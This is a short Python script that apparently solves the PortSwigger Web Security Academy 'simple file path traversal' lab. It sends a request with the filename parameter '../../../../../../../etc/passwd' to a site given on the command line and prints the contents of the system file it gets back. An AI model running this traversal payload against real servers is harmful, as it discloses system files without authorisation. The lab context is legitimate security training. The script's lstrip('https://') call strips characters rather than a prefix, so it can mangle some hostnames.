"""
https://portswigger.net/web-security/file-path-traversal/lab-simple
"""

import sys
import requests

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')
url = f'''https://{site}/image?filename=../../../../../../../etc/passwd'''

s = requests.Session()

resp = s.get(url)
print(resp.text)